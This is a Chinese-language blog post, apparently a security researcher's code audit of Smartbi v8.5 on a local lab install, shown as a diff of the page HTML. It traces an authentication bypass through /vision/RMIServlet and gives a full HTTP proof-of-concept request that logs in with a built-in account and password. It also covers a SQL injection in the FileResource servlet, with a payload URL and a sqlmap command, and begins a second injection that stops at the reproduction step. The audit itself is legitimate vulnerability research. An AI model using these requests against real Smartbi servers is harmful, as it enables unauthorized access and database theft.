@@ -1,0 +1,1083 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Smartbi v8.5 代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Smartbi v8.5 代码审计">
+<meta property="og:url" content="http://xvshifu.github.io/2025/08/07/Smartbi%20v8.5%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="Smartbi v8.5 代码审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702529.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702526.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703762.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703873.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703187.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703694.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703682.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071703554.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071704470.png">
+<meta property="article:published_time" content="2025-08-07T08:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-08T02:07:22.236Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="Java 代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Smartbi v8.5 代码审计 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Smartbi v8.5 代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-07 16:00" pubdate>
+          2025年8月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Smartbi v8.5 代码审计</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年8月8日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Smartbi-v8-5-代码审计"><a href="#Smartbi-v8-5-代码审计" class="headerlink" title="Smartbi v8.5 代码审计"></a>Smartbi v8.5 代码审计</h1><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:.<br>├─Infobright	用于分析型数据存储<br>├─jdk	Java 开发环境<br>├─MySQL		数据库服务<br>├─SmartbiUnionServer	Smartbi 的 Union Server 模块（Presto 引擎相关）<br>├─smartbixmla		Smartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信<br>└─Tomcat	Smartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展<br>    ├─bin	包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志<br>    |<span class="hljs-string">   </span>|<span class="hljs-string">  exts-smartbi		扩展模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string">	</span>|<span class="hljs-string">  Index-smartbi	搜索索引</span><br><span class="hljs-string">    </span>|<span class="hljs-string">	</span>|<span class="hljs-string">  mlogs-smartbi	模块级别日志</span><br><span class="hljs-string">    </span>|<span class="hljs-string">	</span>|<span class="hljs-string">  SmartbiX-ExtractData	 数据导出模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  smartbi_repoBackup	仓库备份</span><br><span class="hljs-string">    </span>|<span class="hljs-string">	</span><br><span class="hljs-string">    ├─conf	配置文件所在</span><br><span class="hljs-string">   	</span>|<span class="hljs-string">	│  catalina.policy</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  catalina.properties</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  context.xml</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  logging.properties</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  server.xml</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  tomcat-users.xml</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│  web.xml</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	│</span><br><span class="hljs-string">	</span>|<span class="hljs-string">	└─Catalina</span><br><span class="hljs-string">    </span>|<span class="hljs-string">			└─localhost</span><br><span class="hljs-string">    ├─lib	包含Tomcat运行所需的JAR库文件</span><br><span class="hljs-string">    ├─logs</span><br><span class="hljs-string">    ├─temp</span><br><span class="hljs-string">    ├─webapps	实际部署的Web应用程序</span><br><span class="hljs-string">    ├─work	 Tomcat 运行时自动生成的 JSP 编译缓存</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助</p>
+<blockquote>
+<p>servlet</p>
+<p><a target="_blank" rel="noopener" href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p>
+</blockquote>
+<h1 id="历史漏洞："><a href="#历史漏洞：" class="headerlink" title="历史漏洞："></a>历史漏洞：</h1><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><blockquote>
+<p>Smartbi 身份认证绕过漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p>
+</blockquote>
+<p>网上的 身份认证&#x2F;内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点</p>
+<p>1、代码分析</p>
+<p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p>
+<p>首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png" srcset="/img/loading.gif" lazyload alt="20250801173411982"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>    <span class="hljs-comment">//判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验）</span><br>    <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>        <span class="hljs-comment">//如果调用的是 UserService 中的方法，即 methodName 属于&#123;&quot;login&quot;, &quot;loginFor&quot;, &quot;clickLogin&quot;, &quot;loginFromDB&quot;, &quot;logout&quot;, &quot;isLogged&quot;, &quot;isLoginAs&quot;, &quot;checkVersion&quot;, &quot;hasLicense&quot;&#125;</span><br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>            <span class="hljs-comment">//则不需要登录验证</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure>
+
+<p>接下来找找 CheckIsLoggedFilter 是在哪里利用的？</p>
+<p> 找到在web.xml中有我们需要的路由 <code>/vision/RMIServlet</code></p>
+<blockquote>
+<p>看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter </p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png" srcset="/img/loading.gif" lazyload alt="20250801175223846"></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png" srcset="/img/loading.gif" lazyload alt="20250801174751116"></p>
+<p>尝试访问 <a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/RMIServlet">http://localhost:18080/smartbi/vision/RMIServlet</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png" srcset="/img/loading.gif" lazyload alt="20250801174912101"></p>
+<p>POC：</p>
+<p>主要结构：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure>
+
+<p>内置用户（service），口令为0a；public、system可能不存在。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png" srcset="/img/loading.gif" lazyload alt="20250806083335304"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png" srcset="/img/loading.gif" lazyload alt="20250801175555800"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png" srcset="/img/loading.gif" lazyload alt="20250801175813702"></p>
+<p>使用hackbar也可以，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png" srcset="/img/loading.gif" lazyload alt="20250801180133641"></p>
+<p>之后访问 <a target="_blank" rel="noopener" href="http://localhost:18080/smartbi/vision/">http://localhost:18080/smartbi/vision/</a></p>
+<p>发现已经进入后台</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png" srcset="/img/loading.gif" lazyload alt="20250801180228087"></p>
+<h2 id="SQL注入（FileResource）"><a href="#SQL注入（FileResource）" class="headerlink" title="SQL注入（FileResource）"></a>SQL注入（FileResource）</h2><p>FileResource 是用于处理文件的 Servlet</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png" srcset="/img/loading.gif" lazyload alt="20250802132757662"></p>
+<p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png" srcset="/img/loading.gif" lazyload alt="20250802132840122"></p>
+<p>分析代码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png" srcset="/img/loading.gif" lazyload alt="20250802133545296"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//从请求中获取 resID</span><br>    resID = request.getParameter(<span class="hljs-string">&quot;resId&quot;</span>);<br>    <span class="hljs-comment">//初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">headerType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inline&quot;</span>;<br>    <span class="hljs-comment">//判断操作类型 opType 是 &quot;OPEN&quot; 还是 &quot;DOWNLOAD&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPEN&quot;</span>.equals(opType)) &#123;<br>        actionType = OperationType.FILE_RESOURCE_OPEN;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;<br>        headerType = <span class="hljs-string">&quot;attachment&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//使用 Connection 对象创建 Statement，用于执行 SQL </span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stat.executeQuery(<span class="hljs-string">&quot;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = &#x27;&quot;</span> + resID + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入</strong></p>
+<p>构造payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/FileResource?resId=<span class="hljs-number">1</span>&amp;opType=DOWNLOAD<br></code></pre></td></tr></table></figure>
+
+<p>可以sqlmap跑一下：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&amp;opType=DOWNLOAD&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png" srcset="/img/loading.gif" lazyload alt="20250802140622564"></p>
+<h2 id="SQL注入（RMIServlet）"><a href="#SQL注入（RMIServlet）" class="headerlink" title="SQL注入（RMIServlet）"></a>SQL注入（RMIServlet）</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png" srcset="/img/loading.gif" lazyload alt="20250805165508359"></p>
+<p>getFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png" srcset="/img/loading.gif" lazyload alt="20250805181321541"></p>
+<p>getFileResource方法在URLLinkService中调用：</p>
+<p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png" srcset="/img/loading.gif" lazyload alt="20250805181341517"></p>
+<p><strong>漏洞复现：</strong></p>
